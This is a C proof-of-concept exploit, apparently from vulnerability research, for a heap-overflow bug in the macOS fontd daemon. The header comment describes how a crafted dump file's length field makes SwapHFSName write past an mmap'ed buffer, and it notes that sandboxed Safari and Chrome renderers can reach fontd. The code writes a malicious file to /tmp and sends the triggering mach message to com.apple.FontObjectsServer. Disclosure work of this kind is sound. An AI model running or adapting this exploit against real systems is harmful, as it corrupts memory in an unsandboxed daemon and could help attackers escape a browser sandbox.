//ianbeer

/*
The fontd message with msgh_id value 0x1e (FOActivateFontsWithInfoMessage) contains two cstrings
at offsets +0x20 and +0x220.
A pointer to the second of these strings is passed to ActivateFontFromMessage which in turn passes it
as the third argument to FODBReviveFromDumpFile which will lstat that string and then open the file if it was a
valid path. It then mmap's the contents of the file into memory. It reads a uint16_t at offset 0xc and swaps the endianness
then passses that value and a pointer to offset 0xc in the mmaped buffer to SwapHFSName. SwapHFSName then uses that uint16_t as the count
of uint16_t's in the buffer to endian-swap. There's no check that the buffer size is valid and SwapHFSName will walk off the end of the mmap'ed
buffer leading to heap corruption.

You need to be able to create at least one file on disk with controlled contents to exploit this bug but most sandboxes allow
that. Safari renderers for example have full write access to many directories and Chrome renderers can use methods like "<a download>"
and content-disposition:attachment headers to get files written to disk. This PoC makes some files in /tmp to trigger the bug
but write access to /tmp is not required. These files could be anywhere where fontd can read them.

fontd is an unsandboxed daemon running as a regular user. It's reachable from various sandboxes including chrome and safari
renderer processes.

*/

#include <stdint.h>
#include <stddef.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/sysctl.h>
#include <dlfcn.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>
#include <unistd.h>
#include <libproc.h>

pid_t find_process(char* executable){
  int name[] = { CTL_KERN, KERN_PROC, KERN_PROC_ALL, 0 };
  size_t length = 0;
  int err;

  err = sysctl(name, 3, NULL, &length, NULL, 0);
  if(err){
    perror(NULL);
    exit(0);
  }

  struct kinfo_proc* proc_list = malloc(length+0x10000);
  err = sysctl(name, 3, proc_list, &length, NULL, 0);

  if(err){
    perror(NULL);
    exit(0);
  }

  int n_procs = length / sizeof(struct kinfo_proc);
  pid_t pid = 0;

  for(int i = 0; i < n_procs; i++){
    pid = proc_list[i].kp_proc.p_pid;

    char path[PROC_PIDPATHINFO_MAXSIZE];
    err = proc_pidpath(pid, path, sizeof(path));
    if(err <= 0){
      continue;
    }

    char* match = strstr(path, executable);
    if(match == NULL){
      continue;
    }

    if((match + strlen(executable)) == (path + strlen(path))){
      free(proc_list);
      return pid;
    }
  }

  free(proc_list);
  return 0; 
}

struct activate_info_msg {
  mach_msg_header_t hdr;
  char pad0[8];
  char first_path[0x200];  // +0x20
  char second_path[0x200]; // +0x220
  char pad1[0x2a0];
  uint32_t client_pid;   // +0x6c0
  uint32_t server_pid;   // +0x6c4
  uint8_t is_le;         // +0x6c8 
};

uint32_t bswap_32(uint32_t v) {
  return (v << 24) | 
         (v & 0xff00) << 8 | 
         (v & 0xff0000) >> 8 |
         (v >> 24);
}

struct fob_dump_file {
  uint32_t big_endian_b;
  char pad[0x18];
  uint16_t str_len;
  char str[100];
};

void send_activate_info_msg(mach_port_t service_port) {
  kern_return_t err;

  struct activate_info_msg m = {0};
  m.hdr.msgh_size = sizeof(struct activate_info_msg);
  m.hdr.msgh_local_port = MACH_PORT_NULL;
  m.hdr.msgh_remote_port = service_port;
  m.hdr.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MAKE_SEND_ONCE);
  m.hdr.msgh_bits |= MACH_MSGH_BITS_COMPLEX;
  m.hdr.msgh_id = 0x1e;
  

  m.client_pid = (uint32_t) getpid();
  m.server_pid = find_process("fontd");
  m.is_le = 1;

  FILE* f_first = fopen("/tmp/first", "w");
  FILE* f_second = fopen("/tmp/second", "w");

  fprintf(f_first, "nothing interesting here\n");

  struct fob_dump_file fob;
  memset(&fob, 'A', sizeof(fob));
  fob.big_endian_b = bswap_32(0xb);
  fob.str_len = 0xffff;
  strcpy(fob.str, "it will trust that length field and bswap words well off the end of the mmap'ed buffer\n");
  fwrite(&fob, sizeof(fob), 1, f_second);

  fclose(f_first);
  fclose(f_second);

  strcpy(m.first_path, "/tmp/first");
  strcpy(m.second_path, "/tmp/second");

  err = mach_msg(&m.hdr,
                 MACH_SEND_MSG,
                 m.hdr.msgh_size,
                 0,
                 MACH_PORT_NULL,
                 MACH_MSG_TIMEOUT_NONE,
                 MACH_PORT_NULL);

  if (err != KERN_SUCCESS) {
    printf(" [-] mach_msg failed with error code:%x\n", err);
    exit(EXIT_FAILURE);
  }
  printf(" [+] looks like that sent?\n");

}

mach_port_t mach_connect(char* service_name){
  kern_return_t err;
  
  mach_port_t bootstrap_port;
  err = task_get_bootstrap_port(mach_task_self(), &bootstrap_port);
  if (err != KERN_SUCCESS) {
    printf(" [-] couldn't get bootstrap port\n");
    exit(EXIT_FAILURE);
  }
  printf(" [+] got bootstrap port\n");

  mach_port_t service_port;
  err = bootstrap_look_up(bootstrap_port, service_name, &service_port);
  if (err != KERN_SUCCESS) {
    printf(" [-] unable to lookup service %s\n", service_name);
    exit(EXIT_FAILURE);
  }
  printf(" [+] got %s mach port\n", service_name);
  return service_port;
}

int main(int argc, char** argv){
  send_activate_info_msg(mach_connect("com.apple.FontObjectsServer"));
  return EXIT_SUCCESS;
}

